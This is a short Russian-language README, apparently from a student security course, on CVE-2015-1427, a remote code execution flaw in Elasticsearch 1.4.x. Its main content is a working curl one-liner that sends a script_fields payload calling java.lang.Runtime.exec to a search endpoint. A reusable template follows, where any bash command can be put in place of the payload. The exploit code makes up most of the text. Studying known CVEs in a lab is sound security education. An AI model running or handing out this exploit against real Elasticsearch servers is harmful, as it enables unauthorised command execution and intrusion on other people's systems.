# CVE-2015-1427
Уязвимость RCE есть в Elastic search 1.4.0 < 1.4.2. 
Elasticsearch – это одна из самых популярных поисковых систем в области Big Data, масштабируемое нереляционное хранилище данных с открытым исходным кодом, аналитическая NoSQL-СУБД с широким набором функций полнотекстового поиска.

## Как работает эксплоит?
Мы использовали данный сплоит:
```bash
curl -s http://localhost:9200/_search\?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}' | grep "myscript" | awk -F '\\[ "' '{print $2}' | sed 's/\\n" ]//g'
```
Он работает следующим образом - посылается POST-запрос с полезной нагрузкой на хост, где используется уязвимая версия Elastic Search'a.
## Как запускается эксплоит?
Запуск эксплойта происходит в среде bash с помощью программы curl(можно любой софт, который позволяет отправлять POST-запросы):

Полезная нагрузка находится в JSON-структуре `script`:
```
"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"ТУТ ЛЮБОЙ BASH-ПЭЙЛОАД").getText()"
```
![](https://github.com/waqeen/cyber_security21/blob/scriptkiddies/solutions/CVE-2015-1427/images/full_access.png)
